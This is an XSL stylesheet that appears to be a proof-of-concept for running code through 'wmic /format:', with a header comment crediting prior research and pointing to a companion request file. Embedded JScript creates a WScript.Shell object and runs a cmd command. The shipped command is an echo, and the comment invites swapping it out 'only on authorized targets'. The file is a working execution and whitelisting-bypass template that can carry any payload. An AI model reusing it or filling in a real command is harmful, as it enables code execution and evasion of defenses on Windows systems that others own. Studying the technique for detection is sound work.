<?xml version='1.0'?>
<!--
  Safe PoC -> x8bitranjit
  Benign WMI XSL for wmic /format: - the script below runs ONLY when wmic
  fetches this file (see windows_wmic_xsl_rce_poc.http). Shipped command is
  a benign echo - replace with id-equivalent only on authorized targets.
  Technique credit: subTee wmic.xsl research. KIT CROSS-REF: CMDI kit, LOLBAS.
-->
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace" version="1.0">
<output method="text"/>
<msxsl:script language="JScript" implements-prefix="user">
  function xml(nodelist) {
    var r = new ActiveXObject("WScript.Shell").Run("cmd /c echo Safe PoC -> x8bitranjit");
    return "";
  }
</msxsl:script>
<xsl:template match="/">
  <xsl:value-of select="user:xml(nodelist)"/>
</xsl:template>
</stylesheet>
